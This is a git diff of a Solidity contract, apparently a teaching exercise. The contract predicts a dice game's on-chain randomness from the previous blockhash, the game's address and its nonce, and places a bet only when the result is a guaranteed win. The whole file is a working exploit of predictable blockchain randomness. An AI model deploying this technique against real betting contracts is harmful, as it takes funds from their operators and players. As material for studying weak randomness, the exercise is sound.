@@ -21,21 +21,24 @@ contract RiggedRoll is Ownable {
 
     // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
     function riggedRoll() external {
-        uint256 predictedRoll = uint256(
-            keccak256(
-                abi.encodePacked(
-                    blockhash(block.number - 1),
-                    address(this)
-                )
-            )
-        ) % 16;
+        require(address(this).balance >= 0.002 ether, "Not enough ETH in RiggedRoll");
 
-        // Only roll if it will win
-        if (predictedRoll <= 2) {
+        bytes32 prevHash = blockhash(block.number - 1);
+        
+        uint256 nonce = diceGame.nonce();
+        
+        bytes32 hash = keccak256(
+            abi.encodePacked(prevHash, address(diceGame), nonce)
+        );
+        
+        uint256 predictedRoll = uint256(hash) % 16;
+
+        if (predictedRoll <= 5) {
             diceGame.rollTheDice{value: 0.002 ether}();
+        } else {
+            console.log("Roll > 5, skipping to avoid loss.");
         }
     }
-
     // Include the `receive()` function to enable the contract to receive incoming Ether.
     receive() external payable {}
 }
